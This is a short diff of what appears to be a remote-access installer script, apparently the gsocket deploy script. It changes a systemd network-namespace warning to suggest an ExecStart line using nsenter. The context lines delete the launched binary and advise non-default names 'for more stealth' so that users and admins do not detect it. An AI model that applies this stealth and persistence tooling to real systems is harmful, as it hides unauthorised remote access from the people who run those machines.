@@ -2345,7 +2345,10 @@ gs_start
 # Give gsnc enough time to read the configuration from its own binary before deleting.
 [[ -n "$GS_NOINST" ]] && { sleep 1; rm -f "${DSTBIN:?}"; }
 
-[ -n "$IS_SYSTEMD" ] && [ "$(ip netns identify 2>/dev/null)" != "$(nsenter -t1 -n ip netns identify 2>/dev/null)" ] && WARN "Network namespace differs. May need to use ${CDY}ExecStart=ip netns exec $(ip netns identify) ${DSTBIN}${CN} #${CRY}PLEASE REPORT THIS${CN}" 
+[ -n "$IS_SYSTEMD" ] && [ "$(ip netns identify 2>/dev/null)" != "$(nsenter -t1 -n ip netns identify 2>/dev/null)" ] && {
+	WARN "Network namespace differs. May need to use - ${CRY}PLEASE REPORT THIS${CN}
+    ${CDM}ExecStart=ip netns exec $(ip netns identify) nsenter -t1 -m ${DSTBIN}${CN}" 
+}
 
 # Default values are known and easily detected by users/admins.
 { [ -z "$GS_BIN" ] || [ -z "$GS_NAME" ]; } && WARN "Using default names is easily detectable. Set these for more stealth
